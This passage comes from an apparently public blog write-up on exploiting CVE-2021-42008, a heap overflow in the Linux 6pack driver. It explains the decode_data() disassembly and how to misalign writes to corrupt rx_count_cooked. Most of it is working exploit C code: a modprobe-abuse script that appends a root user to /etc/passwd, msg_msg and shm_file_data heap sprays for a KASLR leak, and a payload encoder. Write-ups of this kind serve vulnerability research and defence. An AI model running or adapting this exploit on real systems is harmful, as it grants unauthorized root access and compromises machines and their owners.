		<span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">cooked_buf</span><span class="p">[</span><span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count_cooked</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span>
		<span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">inbyte</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">);</span>
	<span class="n">sp</span><span class="o">-&gt;</span><span class="n">rx_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">00</span><span class="o">:</span>        <span class="k">nop</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">05</span><span class="o">:</span>        <span class="k">movzx</span>  <span class="n">r8d</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x35</span><span class="err">]</span> <span class="c1">// r8d = sp-&gt;raw_buf[1]
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">10</span><span class="o">:</span> <span class="p">[1]</span>    <span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x1cc</span><span class="err">]</span> <span class="c1">// eax = sp-&gt;rx_count_cooked
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">16</span><span class="o">:</span>        <span class="k">shl</span>    <span class="n">esi</span><span class="p">,</span><span class="mh">0x2</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">19</span><span class="o">:</span>        <span class="k">lea</span>    <span class="n">edx</span><span class="p">,</span><span class="err">[</span><span class="n">r8</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">27</span><span class="o">:</span> <span class="p">[2]</span>    <span class="k">mov</span>    <span class="n">rcx</span><span class="p">,</span><span class="n">rax</span> <span class="c1">// rcx = sp-&gt;rx_count_cooked
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">30</span><span class="o">:</span>        <span class="k">lea</span>    <span class="n">r9d</span><span class="p">,</span><span class="err">[</span><span class="n">rax</span><span class="o">+</span><span class="mh">0x1</span><span class="err">]</span> <span class="c1">// r9d = sp-&gt;rx_count_cooked + 1
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">34</span><span class="o">:</span>        <span class="k">and</span>    <span class="n">r8d</span><span class="p">,</span><span class="mh">0xf</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">38</span><span class="o">:</span>        <span class="k">and</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0xffffffc0</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">41</span><span class="o">:</span>        <span class="k">or</span>     <span class="n">dl</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x34</span><span class="err">]</span> <span class="c1">// dl or sp-&gt;raw_buf[0]
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">44</span><span class="o">:</span> <span class="p">[3]</span>    <span class="k">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x38</span><span class="err">]</span><span class="p">,</span><span class="n">dl</span> <span class="c1">// Write first decoded byte in sp-&gt;cooked_buf
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">48</span><span class="o">:</span>        <span class="k">movzx</span>  <span class="n">edx</span><span class="p">,</span><span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x36</span><span class="err">]</span> <span class="c1">// eax = sp-&gt;raw_buf[2]
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">52</span><span class="o">:</span>        <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">rdx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mh">0x0</span><span class="err">]</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">59</span><span class="o">:</span>        <span class="k">and</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0x3</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">62</span><span class="o">:</span>        <span class="k">and</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xfffffff0</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">65</span><span class="o">:</span>        <span class="k">or</span>     <span class="n">esi</span><span class="p">,</span><span class="n">edx</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">67</span><span class="o">:</span>        <span class="k">or</span>     <span class="n">eax</span><span class="p">,</span><span class="n">r8d</span>
<span class="n">decode_data</span> <span class="o">+</span> <span class="mi">70</span><span class="o">:</span> <span class="p">[4]</span>    <span class="k">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="n">r9</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x38</span><span class="err">]</span><span class="p">,</span><span class="n">al</span> <span class="c1">// Write second decoded byte in sp-&gt;cooked_buf
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">75</span><span class="o">:</span>        <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">rcx</span><span class="o">+</span><span class="mh">0x3</span><span class="err">]</span> <span class="c1">// eax = sp-&gt;rx_count_cooked + 3
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">78</span><span class="o">:</span> <span class="p">[5]</span>    <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x1cc</span><span class="err">]</span><span class="p">,</span><span class="n">eax</span> <span class="c1">//  sp-&gt;rx_count_cooked = sp-&gt;rx_count_cooked + 3
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">84</span><span class="o">:</span>        <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">rcx</span><span class="o">+</span><span class="mh">0x2</span><span class="err">]</span> <span class="c1">// eax = sp-&gt;rx_count_cooked + 2
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">87</span><span class="o">:</span> <span class="p">[6]</span>    <span class="k">mov</span>    <span class="n">BYTE</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="n">rax</span><span class="o">*</span><span class="mi">1</span><span class="o">+</span><span class="mh">0x38</span><span class="err">]</span><span class="p">,</span><span class="n">sil</span> <span class="c1">// Write third decoded byte in sp-&gt;cooked_buf
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">92</span><span class="o">:</span>        <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rdi</span><span class="o">+</span><span class="mh">0x1c8</span><span class="err">]</span><span class="p">,</span><span class="mh">0x0</span> <span class="c1">// sp-&gt;rx_count = 0
</span><span class="n">decode_data</span> <span class="o">+</span> <span class="mi">102</span><span class="o">:</span>       <span class="k">ret</span>    </code></pre></figure>

<p>The first important thing to note is that predictably, when <strong>decode_data()</strong> is called, and <strong>sp-&gt;raw_buf</strong> contains 3 bytes, GCC optimized the access to <strong>sp-&gt;rx_count_cooked</strong>, so instead of accessing its value multiple times during the write procedure, it is stored in <strong>EAX</strong> <strong>[1]</strong> and then it moved it to <strong>RCX</strong> <strong>[2]</strong> at the beginning of the function.</p>

<p>The second important thing is that instead of three consecutive write operations in <strong>sp-&gt;cooked_buf</strong>, before writing the third decoded byte <strong>[6]</strong>, the value of  <strong>sp-&gt;rx_count_cooked</strong> is updated with its previously stored <strong>[1]</strong> <strong>[2]</strong> value <strong>+ 3</strong> <strong>[5]</strong>. This optimization makes things harder, because if we manage to overwrite the first two bytes of <strong>sp-&gt;rx_count_cooked</strong> thanks to the instructions <strong>[3]</strong> and <strong>[4]</strong>, before overwriting the third byte <strong>[6]</strong>, its value will be updated by instruction <strong>[5]</strong>.</p>

<p>It means that we need to try to use the third write operation <strong>[6]</strong> to overwrite the second byte of <strong>sp-&gt;rx_count_cooked</strong> that corresponds to <strong>sp-&gt;cooked_buf[0x195]</strong>, for example making it <strong>0x06XX</strong> instead of <strong>0x01XX</strong>.</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/3.png" alt=""></p>

<p>Since <strong>decode_data()</strong> is writing 3 bytes at time, starting from index 0 into <strong>sp-&gt;cooked_buf</strong>, each time <strong>decode_data()</strong> is called, the third byte will be written at index 0x2, 0x5, 0x8, …, 0x191, 0x194 and so on. Basically when <strong>sp-&gt;rx_count_cooked</strong> is <strong>0x192</strong> and <strong>decode_data()</strong> is called again, the third write operation will be performed over <strong>sp-&gt;cooked_buf[0x194]</strong>, but we need to overwrite <strong>sp-&gt;cooked_buf[0x195]</strong> with the third decoded byte! We can solve the problem misaligning the writing frame by setting the first byte of <strong>sp-&gt;rx_count_cooked</strong> to <strong>0x90</strong>, so it will become <strong>0x190</strong>. This way, after two more calls to <strong>decode_data()</strong> the third write operation will be performed over <strong>sp-&gt;cooked_buf[0x195]</strong>.</p>

<p>Each time <strong>decode_data()</strong> is called, we basically have a pattern of three operations:</p>

<ul>
  <li>
    <p>First, when <strong>sp-&gt;rx_count_cooked</strong> is equal to <strong>0x192</strong> and <strong>decode_data()</strong> is called again, it writes the first two bytes with instruction <strong>[3]</strong> and <strong>[4]</strong> respectively at <strong>sp-&gt;cooked_buf[0x192]</strong> and <strong>sp-&gt;cooked_buf[0x193]</strong>.</p>
  </li>
  <li>
    <p>Then instruction <strong>[5]</strong> updates <strong>sp-&gt;rx_count_cooked</strong> with its previously stored value + 3: <strong>0x192 + 3</strong>: <strong>0x195</strong>.</p>
  </li>
  <li>
    <p>And finally the third write operation <strong>[6]</strong> overwrites the first byte of <strong>sp-&gt;rx_count_cooked</strong> which corresponds to <strong>sp-&gt;cooked_buf[0x194]</strong>, making it <strong>0x190</strong>.</p>
  </li>
</ul>

<p>Here we have the three operations represented visually:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/4.png" alt=""></p>

<p>Now <strong>sp-&gt;rx_count_cooked</strong> is equal to <strong>0x190</strong>, and we successfully misaligned the writing frame. When <strong>decode_data()</strong> is called again, we have the same pattern of operations:</p>

<ul>
  <li>Write two bytes inside <strong>sp-&gt;cooked_buf</strong> (this time at <strong>sp-&gt;cooked_buf[0x190]</strong> and <strong>sp-&gt;cooked_buf[0x191]</strong>)</li>
  <li>Update <strong>sp-&gt;rx_count_cooked</strong> with its previously stored value + 3 (this time 0x190 + 3: 0x193)</li>
  <li>Write the third byte (this time at <strong>sp-&gt;cooked_buf[0x192]</strong>):</li>
</ul>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/5.png" alt=""></p>

<p>And again, a new call to <strong>decode_data()</strong> will finally set <strong>sp-&gt;rx_count_cooked</strong> to <strong>0x696</strong>. The pattern is always the same:</p>

<ul>
  <li>Write two bytes inside <strong>sp-&gt;cooked_buf</strong> (this time at <strong>sp-&gt;cooked_buf[0x193]</strong> and <strong>sp-&gt;cooked_buf[0x194]</strong>)</li>
  <li>Update <strong>sp-&gt;rx_count_cooked</strong> with its previously stored value + 3 (this time 0x193 + 3: 0x196)</li>
  <li>Write the third byte (this time at <strong>sp-&gt;cooked_buf[0x195]</strong>):</li>
</ul>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/6.png" alt=""></p>

<p>This will trick <strong>decode_data()</strong> into continuing to write our payload <strong>0x0e bytes</strong> inside the next object in memory.
At this point we can start writing our exploit:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">prepare_exploit</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo -e '</span><span class="se">\xdd\xdd\xdd\xdd\xdd\xdd</span><span class="s">' &gt; /tmp/asd"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/asd"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo '#!/bin/sh' &gt; /tmp/x"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"echo 'chmod +s /bin/su' &gt;&gt; /tmp/x"</span><span class="p">);</span> <span class="c1">// Needed for busybox, just in case
</span>    <span class="n">system</span><span class="p">(</span><span class="s">"echo 'echo </span><span class="se">\"</span><span class="s">pwn::0:0:pwn:/root:/bin/sh</span><span class="se">\"</span><span class="s"> &gt;&gt; /etc/passwd' &gt;&gt; /tmp/x"</span><span class="p">);</span> <span class="c1">// [4]
</span>    <span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/x"</span><span class="p">);</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="n">buff2</span> <span class="o">+</span> <span class="mh">0xfc8</span><span class="p">,</span> <span class="s">"/tmp/x</span><span class="se">\00</span><span class="s">"</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">assign_to_core</span><span class="p">(</span><span class="kt">int</span> <span class="n">core_id</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">cpu_set_t</span> <span class="n">mask</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>

    <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">();</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] Assigning process %d to core %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">core_id</span><span class="p">);</span>

    <span class="n">CPU_ZERO</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>
    <span class="n">CPU_SET</span><span class="p">(</span><span class="n">core_id</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">sched_setaffinity</span><span class="p">(</span><span class="n">getpid</span><span class="p">(),</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mask</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">mask</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="c1">// [2]
</span>    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] sched_setaffinity()"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">print_affinity</span><span class="p">();</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="n">assign_to_core</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">// [1]
</span><span class="n">prepare_exploit</span><span class="p">();</span> <span class="c1">// [3]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>Since we are working in a SMD environment and with the SLUB allocator active slabs are managed per-cpu (see <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/slub_def.h#L42">kmem_cache_cpu</a>),
 we need to make sure to operate always on the same processor to 
maximize the success rate of our exploit. We can do it restricting the 
current process to core 0 <strong>[1]</strong> using <a href="https://linux.die.net/man/2/sched_setaffinity">sched_setaffinity()</a> <strong>[2]</strong> which is usable by unprivileged users.
Then we call <strong>prepare_exploit()</strong> to prepare everything we need to abuse <strong>modprobe</strong> <strong>[3]</strong>  (Check References to learn more about this technique or read my <a href="https://syst3mfailure.io/hotrod">Hotrod</a> writeup). As you can see once executed by the kernel, the program will add a new user with root privileges <strong>[4]</strong>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">alloc_msg_queue_A</span><span class="p">(</span><span class="kt">int</span> <span class="n">id</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">qid_A</span><span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="o">=</span> <span class="n">msgget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mo">0666</span> <span class="o">|</span> <span class="n">IPC_CREAT</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgget"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">send_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">qid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">msgbuf</span>
    <span class="p">{</span>
        <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="n">size</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">];</span>
    <span class="p">}</span> <span class="n">msg</span><span class="p">;</span>

    <span class="n">msg</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">msgsnd</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgsnd"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="o">*</span><span class="nf">recv_msg</span><span class="p">(</span><span class="kt">int</span> <span class="n">qid</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">type</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">memdump</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">msgrcv</span><span class="p">(</span><span class="n">qid</span><span class="p">,</span> <span class="n">memdump</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">type</span><span class="p">,</span> <span class="n">IPC_NOWAIT</span> <span class="o">|</span> <span class="n">MSG_COPY</span> <span class="o">|</span> <span class="n">MSG_NOERROR</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] msgrcv"</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">memdump</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">alloc_shm</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">IPC_PRIVATE</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0600</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] shmget fail"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">shmaddr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">SHM_RDONLY</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">shmaddr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"[X] shmat"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="p">[...]</span>

<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Spraying shm_file_data in kmalloc-32..."</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">alloc_shm</span><span class="p">(</span><span class="n">shmid</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span> <span class="c1">// [1]
</span>
<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Spraying messages in kmalloc-4k..."</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_MSG</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">alloc_msg_queue_A</span><span class="p">(</span><span class="n">i</span><span class="p">);</span> <span class="c1">// [2]
</span>
<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">N_MSG</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">send_msg</span><span class="p">(</span><span class="n">qid_A</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mh">0x1018</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span> <span class="c1">// [3]
</span>
<span class="n">recv_msg</span><span class="p">(</span><span class="n">qid_A</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mh">0x1018</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// [4]
</span><span class="n">ptmx</span> <span class="o">=</span> <span class="n">init_sixpack</span><span class="p">();</span> <span class="c1">// [5]
</span>
<span class="p">[...]</span></code></pre></figure>

<p>We can continue spraying many <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/ipc/shm.c#L74">shm_file_data</a> structures in <strong>kmalloc-32</strong>:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">shm_file_data</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">ipc_namespace</span> <span class="o">*</span><span class="n">ns</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">vm_operations_struct</span> <span class="o">*</span><span class="n">vm_ops</span><span class="p">;</span>
<span class="p">};</span></code></pre></figure>

<p>This can be done using <a href="https://linux.die.net/man/2/shmget">shmget()</a> to allocate a shared memory segment and <a href="https://linux.die.net/man/2/shmat">shmat()</a> to attach it to the address space of the calling process. This, later on, will allow us to leak the <a href="https://elixir.bootlin.com/linux/v5.10-rc3/source/include/linux/ipc_namespace.h#L76">init_ipc_ns</a> symbol, located in the kernel data section, compute kernel base, and bypass KASLR.</p>

<p>Afterwards, we allocate <strong>N_MSG</strong> (in our case <strong>N_MSG</strong> is equal to <strong>7</strong>) message queues <strong>[2]</strong> and then for each queue we send a message of <strong>0x1018</strong> bytes (0xfe8 bytes for message body, and 0x30 for message header) using <strong>send_msg()</strong> <strong>[3]</strong> which is a wrapper for <a href="https://linux.die.net/man/2/msgsnd">msgsnd()</a>. Each iteration will allocate a message in <strong>kmalloc-4096</strong> and a segment in <strong>kmalloc-32</strong>. Then we use <strong>recv_msg()</strong>, which is a wrapper for <a href="https://linux.die.net/man/2/msgrcv">msgrcv()</a> to read a message a create a hole in the kernel heap <strong>[4]</strong>. At this point we can finally initialize the sixpack channel as we have seen in the first section. This will allocate a <strong>net_device</strong> structure in <strong>kmalloc-4096</strong> and a <strong>sixpack</strong> structure inside its private data region.</p>

<p>All this will probably create the following situation in memory, where the <strong>sixpack</strong> structure is followed by one of the messages we have just allocated. This message contains a pointer to its respective segment:</p>

<p><img src="2021%20-%20[CVE-2021-42008]%20Exploiting%20A%2016-Year-Old%20Vulnerability%20In%20The%20Linux%206pack%20Driver_files/7.png" alt=""></p>

<p>It is important to note that we don’t know to which of the 6 queues belongs the message allocated right after the <strong>sixpack</strong> structure, so I identified its queue with <strong>QID #X</strong>. We are finally ready to send our malicious payload over the sixpack channel:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">uint8_t</span> <span class="o">*</span><span class="nf">sixpack_encode</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x3000</span><span class="p">);</span>
    <span class="kt">uint32_t</span> <span class="n">raw_count</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// [8]
</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span> <span class="n">count</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">count</span> <span class="o">%</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x3f</span><span class="p">);</span>
            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x30</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">count</span> <span class="o">%</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">dest</span><span class="p">[</span><span class="n">raw_count</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="p">(</span><span class="n">src</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">);</span>
